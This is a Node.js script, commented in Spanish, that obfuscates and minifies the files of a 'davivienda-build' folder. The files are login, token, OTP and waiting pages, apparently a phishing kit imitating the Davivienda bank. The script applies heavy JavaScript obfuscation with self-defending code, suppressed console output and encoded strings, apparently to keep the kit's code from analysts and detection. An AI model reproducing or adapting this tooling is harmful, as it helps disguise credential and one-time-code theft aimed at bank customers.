/* ============================================
   OFUSCAR DAVIVIENDA
   Ofusca HTML + CSS + JS de la carpeta davivienda-build
   ============================================ */

const fs = require('fs');
const path = require('path');
const JavaScriptObfuscator = require('javascript-obfuscator');
const { minify: minifyHTML } = require('html-minifier-terser');
const CleanCSS = require('clean-css');

// ============================================
// CONFIGURACIÓN
// ============================================
const CARPETA = path.join(__dirname, 'davivienda-build');

// Configuración del ofuscador JS
const CONFIG_JS = {
    compact: true,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 0.75,
    deadCodeInjection: true,
    deadCodeInjectionThreshold: 0.4,
    debugProtection: false,
    debugProtectionInterval: 0,
    disableConsoleOutput: true,
    identifierNamesGenerator: 'hexadecimal',
    log: false,
    numbersToExpressions: true,
    renameGlobals: false,
    selfDefending: true,
    simplify: true,
    splitStrings: true,
    splitStringsChunkLength: 10,
    stringArray: true,
    stringArrayCallsTransform: true,
    stringArrayEncoding: ['base64'],
    stringArrayIndexShift: true,
    stringArrayRotate: true,
    stringArrayShuffle: true,
    stringArrayWrappersCount: 2,
    stringArrayWrappersChainedCalls: true,
    stringArrayWrappersParametersMaxCount: 4,
    stringArrayWrappersType: 'function',
    stringArrayThreshold: 0.75,
    unicodeEscapeSequence: false,
    transformObjectKeys: true
};

// ============================================
// FUNCIONES
// ============================================
function ofuscarJS(archivo) {
    const ruta = path.join(CARPETA, archivo);
    if (!fs.existsSync(ruta)) {
        console.log(`   ⚠️  No existe: ${archivo}`);
        return;
    }

    try {
        const codigo = fs.readFileSync(ruta, 'utf8');
        const resultado = JavaScriptObfuscator.obfuscate(codigo, CONFIG_JS);
        fs.writeFileSync(ruta, resultado.getObfuscatedCode());
        console.log(`   ✅ ${archivo}`);
    } catch (err) {
        console.log(`   ❌ Error en ${archivo}: ${err.message}`);
    }
}

async function minificarHTML(archivo) {
    const ruta = path.join(CARPETA, archivo);
    if (!fs.existsSync(ruta)) {
        console.log(`   ⚠️  No existe: ${archivo}`);
        return;
    }

    try {
        const codigo = fs.readFileSync(ruta, 'utf8');
        const resultado = await minifyHTML(codigo, {
            collapseWhitespace: true,
            removeComments: true,
            removeRedundantAttributes: true,
            removeScriptTypeAttributes: true,
            removeStyleLinkTypeAttributes: true,
            useShortDoctype: true,
            minifyCSS: true,
            minifyJS: false
        });
        fs.writeFileSync(ruta, resultado);
        console.log(`   ✅ ${archivo}`);
    } catch (err) {
        console.log(`   ❌ Error en ${archivo}: ${err.message}`);
    }
}

function minificarCSS(archivo) {
    const ruta = path.join(CARPETA, archivo);
    if (!fs.existsSync(ruta)) {
        console.log(`   ⚠️  No existe: ${archivo}`);
        return;
    }

    try {
        const codigo = fs.readFileSync(ruta, 'utf8');
        const resultado = new CleanCSS({ level: 2 }).minify(codigo);
        fs.writeFileSync(ruta, resultado.styles);
        console.log(`   ✅ ${archivo}`);
    } catch (err) {
        console.log(`   ❌ Error en ${archivo}: ${err.message}`);
    }
}

// ============================================
// EJECUTAR
// ============================================
async function main() {
    console.log('\n🔒 OFUSCANDO DAVIVIENDA\n');

    // Ofuscar JS
    console.log('📄 Ofuscando JavaScript:');
    ofuscarJS('login.js');
    ofuscarJS('token.js');
    ofuscarJS('otp.js');
    ofuscarJS('espera.js');

    // Minificar HTML
    console.log('\n📄 Minificando HTML:');
    await minificarHTML('index.html');
    await minificarHTML('login.html');
    await minificarHTML('token.html');
    await minificarHTML('otp.html');
    await minificarHTML('espera.html');

    // Minificar CSS
    console.log('\n📄 Minificando CSS:');
    minificarCSS('styles.css');
    minificarCSS('login.css');

    console.log('\n✅ DAVIVIENDA OFUSCADO CORRECTAMENTE\n');
}

main();